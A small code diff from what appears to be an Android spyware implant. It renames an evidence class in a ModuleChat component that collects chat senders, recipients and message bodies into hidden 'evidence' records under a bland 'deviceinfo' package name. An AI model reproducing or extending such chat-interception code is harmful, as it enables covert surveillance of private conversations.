@@ -6,7 +6,7 @@ import com.android.deviceinfo.ProcessInfo;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfModule;
-import com.android.deviceinfo.evidence.EvidenceReference;
+import com.android.deviceinfo.evidence.EvidenceBuilder;
 import com.android.deviceinfo.evidence.EvidenceType;
 import com.android.deviceinfo.interfaces.Observer;
 import com.android.deviceinfo.listener.ListenerProcess;
@@ -113,7 +113,7 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 			items.add(WChar.getBytes(message.displayTo, true));
 			// CONTENT
 			items.add(WChar.getBytes(message.body, true));
-			items.add(ByteArray.intToByteArray(EvidenceReference.E_DELIMITER));
+			items.add(ByteArray.intToByteArray(EvidenceBuilder.E_DELIMITER));
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (saveEvidence): " + datetime.toString() + " " + message.from + " -> " + message.to
@@ -121,7 +121,7 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 			}
 		}
 
-		EvidenceReference.atomic(EvidenceType.CHATNEW, items);
+		EvidenceBuilder.atomic(EvidenceType.CHATNEW, items);
 	}
 
 	@Override
